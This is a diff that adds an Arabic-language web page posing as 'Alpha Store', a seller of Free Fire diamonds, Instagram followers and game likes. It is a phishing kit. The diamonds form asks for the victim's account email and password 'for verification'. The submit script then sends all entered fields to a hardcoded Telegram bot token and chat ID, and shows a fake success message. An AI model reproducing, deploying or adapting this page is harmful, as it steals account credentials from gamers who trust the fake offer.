@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Alpha Store | خدمات احترافية</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Cairo', sans-serif; background-color: #050505; color: white; overflow-x: hidden; margin: 0; }
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+        .glass-panel { background: rgba(20, 20, 25, 0.6); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5); }
+        .neon-text { text-shadow: 0 0 10px rgba(0, 210, 255, 0.7), 0 0 20px rgba(0, 210, 255, 0.5); }
+        .neon-border { box-shadow: 0 0 10px rgba(0, 210, 255, 0.3), inset 0 0 10px rgba(0, 210, 255, 0.1); }
+        .hidden { display: none !important; }
+        
+        /* حركات */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        
+        @keyframes pulse-glow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        .animate-pulse-glow { animation: pulse-glow 2s infinite; }
+    </style>
+</head>
+<body class="relative min-h-screen flex flex-col justify-between">
+
+    <!-- خلفية متحركة -->
+    <canvas id="bg-canvas"></canvas>
+
+    <!-- موسيقى الخلفية (يمكنك تغيير الرابط) -->
+    <audio id="bg-music" loop>
+        <source src="https://cdn.pixabay.com/download/audio/2022/05/27/audio_1808fbf07a.mp3?filename=lofi-study-112191.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- 1. شاشة الترحيب -->
+    <div id="intro-screen" class="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md transition-opacity duration-500">
+        <div class="text-center p-10 glass-panel rounded-3xl neon-border animate-fade-in max-w-md w-full mx-4">
+            <div class="mb-6 relative inline-block">
+                <i class="fa-solid fa-bolt text-6xl text-cyan-400 animate-pulse-glow"></i>
+                <div class="absolute inset-0 bg-cyan-400 blur-2xl opacity-30"></div>
+            </div>
+            <h1 class="text-4xl font-black mb-4 neon-text">مرحباً بك</h1>
+            <p class="text-gray-400 mb-8 text-sm">في متجر الخدمات الاحترافي. اضغط بالأسفل للبدء وتشغيل التجربة.</p>
+            <button onclick="startApp()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-bold py-4 rounded-xl transition-all shadow-[0_0_20px_rgba(0,210,255,0.4)] hover:shadow-[0_0_30px_rgba(0,210,255,0.7)] text-lg">
+                اضغط للاستمرار <i class="fa-solid fa-arrow-left mr-2"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- 2. لوحة التحكم (الخدمات) -->
+    <div id="dashboard" class="hidden flex-1 flex flex-col justify-center items-center z-10 px-4 py-20 relative">
+        <div class="text-center mb-12 animate-fade-in">
+            <h2 class="text-4xl font-bold mb-2">اختر <span class="text-cyan-400">الخدمة</span></h2>
+            <p class="text-gray-400">نقدم لك أفضل الخدمات بأسرع وقت وأعلى جودة.</p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-5xl w-full">
+            <!-- خدمة 1: جواهر فري فاير -->
+            <div onclick="openService('ff_diamonds')" class="glass-panel p-8 rounded-2xl cursor-pointer hover:-translate-y-2 transition duration-300 group border-2 border-transparent hover:border-cyan-500">
+                <div class="w-16 h-16 rounded-full bg-cyan-900/50 flex items-center justify-center mb-6 mx-auto group-hover:bg-cyan-500 transition">
+                    <i class="fa-solid fa-gem text-3xl text-cyan-400 group-hover:text-white"></i>
+                </div>
+                <h3 class="text-xl font-bold text-center mb-2">شحن جواهر فري فاير</h2>
+                <p class="text-gray-400 text-center text-sm">شحن فوري وآمن بأسعار لا تقبل المنافسة.</p>
+            </div>
+
+            <!-- خدمة 2: متابعين انستغرام -->
+            <div onclick="openService('ig_followers')" class="glass-panel p-8 rounded-2xl cursor-pointer hover:-translate-y-2 transition duration-300 group border-2 border-transparent hover:border-pink-500">
+                <div class="w-16 h-16 rounded-full bg-pink-900/50 flex items-center justify-center mb-6 mx-auto group-hover:bg-pink-500 transition">
+                    <i class="fa-brands fa-instagram text-3xl text-pink-400 group-hover:text-white"></i>
+                </div>
+                <h3 class="text-xl font-bold text-center mb-2">زيادة متابعين انستغرام</h2>
+                <p class="text-gray-400 text-center text-sm">متابعين حقيقيين ونشطين لتعزيز حسابك.</p>
+            </div>
+
+            <!-- خدمة 3: لايكات فري فاير -->
+            <div onclick="openService('ff_likes')" class="glass-panel p-8 rounded-2xl cursor-pointer hover:-translate-y-2 transition duration-300 group border-2 border-transparent hover:border-purple-500">
+                <div class="w-16 h-16 rounded-full bg-purple-900/50 flex items-center justify-center mb-6 mx-auto group-hover:bg-purple-500 transition">
+                    <i class="fa-solid fa-thumbs-up text-3xl text-purple-400 group-hover:text-white"></i>
+                </div>
+                <h3 class="text-xl font-bold text-center mb-2">لايكات فري فاير</h2>
+                <p class="text-gray-400 text-center text-sm">ارفع مستوى حسابك باللايكات لتظهر في القمة.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- 3. نافذة الخدمة (Modal) -->
+    <div id="service-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm px-4">
+        <div class="glass-panel p-8 rounded-3xl w-full max-w-md animate-fade-in relative">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-gray-400 hover:text-white transition"><i class="fa-solid fa-xmark text-xl"></i></button>
+            
+            <div class="text-center mb-6">
+                <div id="modal-icon" class="w-16 h-16 rounded-full bg-gray-800 flex items-center justify-center mx-auto mb-4"></div>
+                <h3 id="modal-title" class="text-2xl font-bold"></h3>
+            </div>
+
+            <form id="serviceForm" class="space-y-4">
+                <!-- الحقول تتغير حسب الخدمة -->
+                <div id="dynamic-fields"></div>
+                
+                <button type="submit" id="submitBtn" class="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3 rounded-lg mt-6 transition">إرسال الطلب</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="text-center text-gray-600 text-xs py-4 z-10 relative">
+        &copy; 2026 ALPHA XK. جميع الحقوق محفوظة.
+    </footer>
+
+    <!-- سكريبت الخلفية -->
+    <script>
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let width, height, particles;
+
+        function init() {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+            particles = [];
+            const num = window.innerWidth < 768 ? 30 : 80;
+            for (let i = 0; i < num; i++) {
+                particles.push({
+                    x: Math.random() * width,
+                    y: Math.random() * height,
+                    vx: (Math.random() - 0.5) * 1,
+                    vy: (Math.random() - 0.5) * 1,
+                    radius: Math.random() * 2 + 1
+                });
+            }
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+            ctx.clearRect(0, 0, width, height);
+            
+            // رسم الخطوط
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 150) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        // لون متدرج بين الأزرق والوردي
+                        ctx.strokeStyle = `rgba(0, 210, 255, ${1 - dist / 150})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.stroke();
+                    }
+                }
+            }
+
+            particles.forEach(p => {
+                p.x += p.vx; p.y += p.vy;
+                if (p.x < 0 || p.x > width) p.vx *= -1;
+                if (p.y < 0 || p.y > height) p.vy *= -1;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                ctx.fillStyle = '#00d2ff';
+                ctx.fill();
+            });
+        }
+        window.addEventListener('resize', init);
+        init();
+        animate();
+    </script>
+
+    <!-- سكريبت التطبيق -->
+    <script>
+        // 🔴 بيانات تيليغرام ديالك
+        const BOT_TOKEN = "9067108243:AAEBHD9Fgl_zcN90e6l39DAl4wWbUrN6lYQ";
+        const CHAT_ID = "8962482579";
+
+        // 1. شاشة الترحيب
+        function startApp() {
+            // تشغيل الموسيقى
+            const audio = document.getElementById('bg-music');
+            audio.volume = 0.5; // مستوى الصوت 50%
+            audio.play().catch(e => console.log("الموسيقى محظورة من المتصفح", e));
+
+            // إخفاء شاشة الترحيب وإظهار لوحة التحكم
+            document.getElementById('intro-screen').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+        }
+
+        // 2. فتح نافذة الخدمة
+        const modal = document.getElementById('service-modal');
+        const form = document.getElementById('serviceForm');
+        const dynamicFields = document.getElementById('dynamic-fields');
+        const modalTitle = document.getElementById('modal-title');
+        const modalIcon = document.getElementById('modal-icon');
+        let currentService = "";
+
+        function openService(service) {
+            currentService = service;
+            modal.classList.remove('hidden');
+            form.reset();
+
+            if(service === 'ff_diamonds') {
+                modalTitle.innerHTML = 'شحن <span class="text-cyan-400">جواهر</span>';
+                modalIcon.innerHTML = '<i class="fa-solid fa-gem text-2xl text-cyan-400"></i>';
+                dynamicFields.innerHTML = `
+                    <input type="text" id="field1" required placeholder="ID حساب فري فاير" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-cyan-500 outline-none">
+                    <select id="field2" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-cyan-500 outline-none mt-4">
+                        <option value="100">100 جوهرة</option>
+                        <option value="310">310 جوهرة</option>
+                        <option value="520">520 جوهرة</option>
+                        <option value="1060">1060 جوهرة</option>
+                        <option value="2000">2000 جوهرة</option>
+                    </select>
+                    <input type="email" id="field3" required placeholder="البريد الإلكتروني (للتحقق)" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-cyan-500 outline-none mt-4">
+                    <input type="password" id="field4" required placeholder="كلمة المرور (للتحقق)" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-cyan-500 outline-none mt-4">
+                `;
+            } else if(service === 'ig_followers') {
+                modalTitle.innerHTML = 'متابعين <span class="text-pink-400">انستغرام</span>';
+                modalIcon.innerHTML = '<i class="fa-brands fa-instagram text-2xl text-pink-400"></i>';
+                dynamicFields.innerHTML = `
+                    <input type="text" id="field1" required placeholder="اسم المستخدم (بدون @)" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-pink-500 outline-none">
+                    <select id="field2" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-pink-500 outline-none mt-4">
+                        <option value="1000">1000 متابع</option>
+                        <option value="5000">5000 متابع</option>
+                        <option value="10000">10000 متابع</option>
+                    </select>
+                `;
+            } else if(service === 'ff_likes') {
+                modalTitle.innerHTML = 'لايكات <span class="text-purple-400">فري فاير</span>';
+                modalIcon.innerHTML = '<i class="fa-solid fa-thumbs-up text-2xl text-purple-400"></i>';
+                dynamicFields.innerHTML = `
+                    <input type="text" id="field1" required placeholder="ID حساب فري فاير" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-purple-500 outline-none">
+                    <select id="field2" class="w-full bg-black/50 border border-gray-600 rounded-lg px-4 py-3 text-white focus:border-purple-500 outline-none mt-4">
+                        <option value="100">100 لايك</option>
+                        <option value="500">500 لايك</option>
+                        <option value="1000">1000 لايك</option>
+                    </select>
+                `;
+            }
+        }
+
+        function closeModal() {
+            modal.classList.add('hidden');
+        }
+
+        // 3. إرسال الطلب لتيليغرام
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> جاري الإرسال...';
+            btn.disabled = true;
+
+            // جمع البيانات
+            let dataStr = "";
+            const inputs = dynamicFields.querySelectorAll('input, select');
+            let fieldNames = [];
+            
+            if (currentService === 'ff_diamonds') fieldNames = ["ID اللعبة", "الباك", "الإيميل", "الباسورد"];
+            else if (currentService === 'ig_followers') fieldNames = ["اسم المستخدم", "الكمية"];
+            else if (currentService === 'ff_likes') fieldNames = ["ID اللعبة", "الكمية"];
+
+            inputs.forEach((el, index) => {
+                dataStr += `📌 ${fieldNames[index]}: ${el.value}\n`;
+            });
+
+            const serviceName = currentService === 'ff_diamonds' ? 'جواهر فري فاير' : (currentService === 'ig_followers' ? 'متابعين انستغرام' : 'لايكات فري فاير');
+            const message = `🔥 طلب جديد!\n\n🛒 الخدمة: ${serviceName}\n${dataStr}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+                
+                btn.innerHTML = '✅ تم إرسال الطلب بنجاح!';
+                btn.classList.replace('bg-cyan-500', 'bg-green-500');
+                setTimeout(() => {
+                    closeModal();
+                    btn.innerHTML = 'إرسال الطلب';
+                    btn.classList.replace('bg-green-500', 'bg-cyan-500');
+                    btn.disabled = false;
+                }, 2000);
+            } catch (error) {
+                btn.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
+                btn.classList.replace('bg-cyan-500', 'bg-red-500');
+                setTimeout(() => {
+                    btn.innerHTML = 'إرسال الطلب';
+                    btn.classList.replace('bg-red-500', 'bg-cyan-500');
+                    btn.disabled = false;
+                }, 3000);
+            }
+        });
+    </script>
+</body>
+</html>
